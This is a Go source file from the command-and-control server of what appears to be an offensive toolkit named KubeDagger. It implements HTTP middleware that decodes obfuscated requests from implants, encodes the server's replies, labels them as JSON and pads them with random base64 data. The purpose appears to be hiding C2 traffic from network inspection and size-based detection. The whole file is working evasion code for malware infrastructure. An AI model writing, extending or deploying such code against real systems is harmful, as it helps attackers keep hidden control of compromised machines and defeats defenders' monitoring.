package c2server

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"io"
	"math/big"
	"net/http"

	"github.com/yasindce1998/KubeDagger/pkg/agent/stealth"
)

type ObfuscationMiddleware struct {
	encoder *stealth.Encoder
}

func NewObfuscationMiddleware(key string) *ObfuscationMiddleware {
	return &ObfuscationMiddleware{
		encoder: stealth.NewEncoder(key),
	}
}

func (om *ObfuscationMiddleware) Middleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
		r.Body.Close()
		if err != nil {
			http.Error(w, "read error", http.StatusBadRequest)
			return
		}

		decoded, err := om.encoder.Decode(body)
		if err != nil {
			http.Error(w, "decode error", http.StatusBadRequest)
			return
		}
		r.Body = io.NopCloser(bytes.NewReader(decoded))
		r.ContentLength = int64(len(decoded))

		rw := &obfuscatingResponseWriter{
			ResponseWriter: w,
			encoder:        om.encoder,
			statusCode:     http.StatusOK,
		}
		next.ServeHTTP(rw, r)
		rw.flush()
	})
}

type obfuscatingResponseWriter struct {
	http.ResponseWriter
	encoder    *stealth.Encoder
	buf        bytes.Buffer
	statusCode int
	written    bool
}

func (rw *obfuscatingResponseWriter) WriteHeader(code int) {
	rw.statusCode = code
}

func (rw *obfuscatingResponseWriter) Write(data []byte) (int, error) {
	rw.written = true
	return rw.buf.Write(data)
}

func (rw *obfuscatingResponseWriter) flush() {
	if !rw.written && rw.statusCode == http.StatusNoContent {
		rw.ResponseWriter.WriteHeader(http.StatusNoContent)
		return
	}

	if rw.buf.Len() == 0 {
		rw.ResponseWriter.WriteHeader(rw.statusCode)
		return
	}

	padded := appendPadding(rw.buf.Bytes())

	encoded, err := rw.encoder.Encode(padded)
	if err != nil {
		rw.ResponseWriter.WriteHeader(http.StatusInternalServerError)
		return
	}

	rw.ResponseWriter.Header().Set("Content-Type", "application/json")
	rw.ResponseWriter.WriteHeader(rw.statusCode)
	_, _ = rw.ResponseWriter.Write(encoded)
}

func appendPadding(data []byte) []byte {
	padLen, err := rand.Int(rand.Reader, big.NewInt(449))
	if err != nil {
		return data
	}
	size := int(padLen.Int64()) + 64

	pad := make([]byte, size)
	_, _ = rand.Read(pad)
	padStr := base64.RawURLEncoding.EncodeToString(pad)

	if len(data) < 2 || data[len(data)-1] != '}' {
		return data
	}

	result := make([]byte, 0, len(data)+len(padStr)+10)
	result = append(result, data[:len(data)-1]...)
	result = append(result, `,"_p":"`...)
	result = append(result, padStr...)
	result = append(result, `"}`...)
	return result
}
